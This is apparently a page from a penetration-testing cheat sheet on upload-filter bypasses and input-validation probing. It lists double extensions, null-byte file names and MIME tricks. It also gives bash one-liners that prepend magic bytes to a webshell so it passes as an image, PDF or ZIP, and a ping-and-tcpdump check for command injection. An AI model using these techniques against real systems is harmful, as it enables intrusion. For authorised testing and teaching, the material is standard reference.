---
icon: intersection
---

# User Endpoints

<details>

<summary><mark style="color:purple;"><strong><code>File Upload Filtering</code></strong></mark></summary>

{% hint style="info" %}
<mark style="color:red;">**`Executable extensions`**</mark>

<mark style="color:orange;">**`.php`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">Standard extension for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**PHP scripts**</mark><mark style="color:purple;">.</mark>

&#x20;<mark style="color:orange;">**`.php5`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">Used for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**PHP version 5 scripts**</mark><mark style="color:purple;">.</mark>

&#x20;<mark style="color:orange;">**`.phtml`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">**PHP scripts**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">with an alternative extension, often for compatibility or aesthetic reasons.</mark>

&#x20;<mark style="color:orange;">**`.pht`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">Less common extension, used for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**PHP files**</mark><mark style="color:purple;">; sometimes bypasses naive filters.</mark>

&#x20;<mark style="color:orange;">**`.phps`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">Typically used for PHP</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**source code highlighting**</mark><mark style="color:purple;">.</mark>

&#x20;<mark style="color:orange;">**`.php3`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">Extension for older PHP 3 scripts; still valid in some configurations.</mark>

&#x20;<mark style="color:orange;">**`.asp`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">**Active Server Pages**</mark><mark style="color:purple;">, Microsoftâ€™s server-side scripting technology.</mark>

&#x20;<mark style="color:orange;">**`.aspx`**</mark> <mark style="color:purple;">**->**</mark> <mark style="color:purple;">**Advanced ASP.NET**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">pages used for dynamic web content on Microsoft platforms.</mark>

&#x20;<mark style="color:orange;">**`.jsp`**</mark> <mark style="color:purple;">**-> Java Server Pages**</mark><mark style="color:purple;">, used for dynamic web applications in Java environments.</mark>
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Test filters`**</mark>

* <mark style="color:purple;">There are normally three ways a web server</mark> <mark style="color:purple;">will check for valid file types by comparing them to an allow- or deny-list:</mark>
* <mark style="color:orange;">**`File extension`**</mark> <mark style="color:purple;">**:**</mark>
  * <mark style="color:purple;">**Double extensions:**</mark>
    * <mark style="color:orange;">**`.png.php`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`.jpg.php`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`.png.asp`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`.gif.jsp`**</mark>
  * <mark style="color:purple;">**Null byte injection:**</mark>
    * <mark style="color:orange;">**`file.php%00.jpg`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`file.asp%00.png`**</mark>
* <mark style="color:orange;">**`Content-Type`**</mark> <mark style="color:purple;">**headers:**</mark>
  * <mark style="color:purple;">**Executable types:**</mark>&#x20;
    * <mark style="color:orange;">**`application/x-php`**</mark>
    * <mark style="color:orange;">**`application/x-sh`**</mark>&#x20;
    * <mark style="color:orange;">**`application/x-msdownload`**</mark>
    * <mark style="color:orange;">**`application/x-python-code`**</mark>&#x20;
  * &#x20;<mark style="color:purple;">**Image Types:**</mark>
    * &#x20;<mark style="color:orange;">**`image/png`**</mark><mark style="color:purple;">**,**</mark><mark style="color:orange;">**`image/jpeg`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`image/gif`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`image/bmp`**</mark><mark style="color:purple;">**,**</mark> <mark style="color:orange;">**`image/svg+xml`**</mark>
  * <mark style="color:orange;">**`MIME`**</mark> <mark style="color:purple;">**Confusion:**</mark>
    * <mark style="color:orange;">**`text/html`**</mark> <mark style="color:purple;">instead of</mark> <mark style="color:orange;">**`application/json`**</mark>
    * <mark style="color:orange;">**`text/plain`**</mark> <mark style="color:purple;">to trick servers.</mark>
* [<mark style="color:orange;">**`Magic bytes`**</mark>](https://en.wikipedia.org/wiki/List_of_file_signatures) <mark style="color:purple;">(file signature)</mark>
  * <mark style="color:purple;">**Online hex editor ->**</mark> [<mark style="color:orange;">**`HexED.it`**</mark>](https://hexed.it/)

{% code title="PNG" %}
```bash
echo "89504e470d0a1a0a" | xxd -r -p > magic_bytes.bin; cat magic_bytes.bin webshell.php > malicious.png
```
{% endcode %}

{% code title="JPEG" overflow="wrap" %}
```bash
echo "ffd8ff" | xxd -r -p > magic_bytes.bin; cat magic_bytes.bin webshell.php > malicious.jpg
```
{% endcode %}

{% code title="GIF" overflow="wrap" %}
```bash
echo "47494638" | xxd -r -p > magic_bytes.bin; cat magic_bytes.bin webshell.php > malicious.gif
```
{% endcode %}

{% code title="PDF" overflow="wrap" %}
```bash
echo "25504446" | xxd -r -p > magic_bytes.bin; cat magic_bytes.bin webshell.php > malicious.pdf
```
{% endcode %}

{% code title="ZIP" overflow="wrap" %}
```bash
echo "504b0304" | xxd -r -p > magic_bytes.bin; cat magic_bytes.bin webshell.php > malicious.zip
```
{% endcode %}
{% endhint %}

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Check Input Sanitation/Validation</code></strong></mark></summary>

* <mark style="color:purple;">Submit especial characters in the request -></mark> <mark style="color:orange;">**`!@$%^&`**</mark>

- <mark style="color:purple;">In Linux IP addresses can be written in</mark> <mark style="color:orange;">**`decimal`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`HEX`**</mark><mark style="color:purple;">, this can be useful if</mark> <mark style="color:orange;">**`dots`**</mark> <mark style="color:purple;">are blacklisted.</mark>

{% hint style="info" %}
<mark style="color:red;">**`Prove the Injection`**</mark>

* <mark style="color:purple;">If you find a command injection, test whether the system can establish outbound connections to an external server:</mark>  &#x20;

```
ping+10.10.10.10
```

* <mark style="color:purple;">And wait for  it with</mark> <mark style="color:orange;">**`tcpdump`**</mark><mark style="color:purple;">**:**</mark>

```bash
tcpdump -i tun0 icmp
```
{% endhint %}

</details>
